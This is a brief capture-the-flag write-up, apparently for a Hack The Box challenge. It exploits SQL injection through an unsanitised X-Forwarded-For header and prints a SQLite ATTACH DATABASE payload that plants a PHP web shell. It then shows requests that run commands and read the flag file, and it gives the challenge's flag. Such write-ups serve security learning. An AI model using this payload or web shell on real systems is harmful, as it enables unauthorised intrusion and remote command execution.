Look at code see `X-Forwarded-For` is read and not sanitised, so we have sql injection
Doing some research we find out we can make a new php file with code in it
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---attach-database
```
', ''); ATTACH DATABASE '/www/run.php' AS run; CREATE TABLE run.pwn (data text); INSERT INTO run.pwn (data) VALUES ("<?php system($_GET['cmd']); ?>"); -- 
```

```
GET /run.php?cmd=ls /
GET /run.php?cmd=cat /flag_1d23c48aade7db8.txt
```
```
HTB{inj3ct3d_th3_tru7h}
```